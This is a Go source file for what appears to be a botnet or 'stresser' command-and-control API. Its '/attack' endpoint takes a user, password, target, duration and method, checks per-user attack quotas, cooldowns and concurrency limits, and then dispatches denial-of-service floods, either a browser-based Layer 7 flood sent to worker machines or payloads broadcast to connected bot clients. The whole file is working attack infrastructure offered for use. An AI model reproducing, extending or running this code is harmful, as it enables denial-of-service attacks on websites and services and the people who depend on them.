package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

// NewAPI will create the new API server.
func NewAPI() {
	mux := mux.NewRouter()
	mux.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		type Result struct {
			Success  bool              `json:"success"`
			Error    string            `json:"error"`
			Target   string            `json:"target"`
			Duration string            `json:"duration"`
			Method   string            `json:"method"`
			Flags    map[string]string `json:"flags"`
		}

		// Checks for missing parameters needed
		if r.URL.Query().Get("user") == "" || r.URL.Query().Get("password") == "" || r.URL.Query().Get("target") == "" || r.URL.Query().Get("duration") == "" || r.URL.Query().Get("method") == "" {
			w.WriteHeader(http.StatusBadRequest)
			response, err := json.Marshal(&Result{Success: false, Error: "missing required parameters"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		// FindUser will return the user from the database if it was found
		user, err := FindUser(r.URL.Query().Get("user"))
		if err != nil || user == nil {
			w.WriteHeader(http.StatusUnauthorized)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown username"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		} else if user.Password != r.URL.Query().Get("password") {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown password for that user"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		} else if !user.API {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "you don't have api access"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		// Si el método es !browser, manejarlo por separado (sin bots)
		if r.URL.Query().Get("method") == "!browser" {
			url := r.URL.Query().Get("target")
			rateStr := r.URL.Query().Get("rate")
			durationStr := r.URL.Query().Get("duration")
			if url == "" || rateStr == "" || durationStr == "" {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "missing parameters: target, rate, duration"})
				return
			}
			rate, err := strconv.Atoi(rateStr)
			if err != nil || rate < 1 || rate > 250 {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "rate must be 1-250"})
				return
			}
			duration, err := strconv.Atoi(durationStr)
			if err != nil || duration <= 0 {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "invalid duration"})
				return
			}
			if duration > user.Maxtime {
				w.WriteHeader(http.StatusForbidden)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: fmt.Sprintf("duration exceeds user maxtime (%d)", user.Maxtime)})
				return
			}

			sent, err := UserOngoingAttacks(user.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
			if err == nil && len(sent) >= user.MaxDaily && !user.Admin {
				w.WriteHeader(http.StatusForbidden)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "daily attack limit exceeded"})
				return
			}

			thererunning, _ := UserOngoingAttacks(user.Username, time.Now())
			if len(thererunning) > 0 && user.Cooldown > 0 {
				recent := thererunning[0]
				for _, a := range thererunning {
					if a.Sent > recent.Sent {
						recent = a
					}
				}
				if recent.Sent+int64(user.Cooldown) > time.Now().Unix() {
					w.WriteHeader(http.StatusForbidden)
					json.NewEncoder(w).Encode(&Result{Success: false, Error: "user in cooldown"})
					return
				}
			}

			running, err := UserOngoingAttacks(user.Username, time.Now())
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "error checking concurrent attacks"})
				return
			}
			if user.Conns > 0 && len(running) >= user.Conns {
				w.WriteHeader(http.StatusForbidden)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "concurrent attack limit exceeded"})
				return
			}

			globalRunning, err := OngoingAttacks(time.Now())
			if err != nil || len(globalRunning) >= Options.Templates.Attacks.MaximumOngoing {
				w.WriteHeader(http.StatusServiceUnavailable)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "maximum global attack slots reached"})
				return
			}

			workersMux.RLock()
			workerCount := len(workers)
			workersMux.RUnlock()
			if workerCount == 0 {
				w.WriteHeader(http.StatusServiceUnavailable)
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "no L7 workers available"})
				return
			}

			cmd := map[string]interface{}{
				"type":     "attack",
				"method":   "browser",
				"url":      url,
				"rate":     rate,
				"duration": duration,
				"user":     user.Username,
			}
			SendToWorkers(cmd)

			LogAttack(&AttackLog{
				Target:   url,
				Duration: duration,
				Flags:    fmt.Sprintf("rate=%d", rate),
				Sent:     time.Now().Unix(),
				Finish:   time.Now().Add(time.Duration(duration) * time.Second).Unix(),
				User:     user.Username,
				Devices:  0,
			})

			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(&Result{
				Success:  true,
				Target:   url,
				Duration: strconv.Itoa(duration),
				Method:   "!browser",
				Flags:    map[string]string{"rate": strconv.Itoa(rate)},
			})
			return
		}

		method, ok := IsMethod(r.URL.Query().Get("method"))
		if !ok || method == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown method presented"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		// Prepares the flags
		flags := make([]string, 0)
		pretty := make(map[string]string)
		for key, item := range r.URL.Query() {
			if _, ok := Flags[key]; !ok || key == "method" {
				continue
			}

			pretty[key] = strings.Join(item, " ")
			flags = append(flags, key+"="+strings.Join(item, ""))
		}

		attack, err := method.Parse(append([]string{r.URL.Query().Get("method"), r.URL.Query().Get("target"), r.URL.Query().Get("duration")}, flags...), user)
		if err != nil || attack == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		payload, err := attack.Bytes()
		if err != nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		BroadcastClients(payload)
		w.WriteHeader(http.StatusOK)
		response, err := json.Marshal(&Result{Success: true, Target: r.URL.Query().Get("target"), Duration: r.URL.Query().Get("duration"), Method: r.URL.Query().Get("method"), Flags: pretty})
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		w.Write(response)
	})

	switch Options.Templates.API.TLS {
	case true: // TLS
		http.ListenAndServeTLS(Options.Templates.API.Listener, Options.Templates.API.Cert, Options.Templates.API.Key, mux)
	default:
		http.ListenAndServe(Options.Templates.API.Listener, mux)
	}
}
